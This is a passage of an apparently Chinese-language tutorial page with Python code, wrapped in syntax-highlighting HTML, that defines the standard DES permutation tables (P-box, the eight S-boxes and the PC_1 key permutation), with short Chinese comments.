P_Box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span>
         <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>
         <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span>
         <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span>

<span class="token comment"># S盒</span>
S_Box <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span>
     <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
     <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
     <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

    <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>
     <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>
     <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>
     <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

    <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
     <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>
     <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span>
     <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

    <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>
     <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span>
     <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span>
     <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span>
     <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span>
     <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>
     <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

    <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>
     <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
     <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span>
     <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

    <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>
     <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span>
     <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span>
     <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

    <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span>
     <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span>
     <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
     <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

<span class="token punctuation">]</span>

<span class="token comment"># 密钥置换</span>
PC_1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span>
        <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span>
        <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span>
        <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span>
        <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>
        <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span>
        <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span>
        <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>

<span class="token comment"># 压缩置换</span>
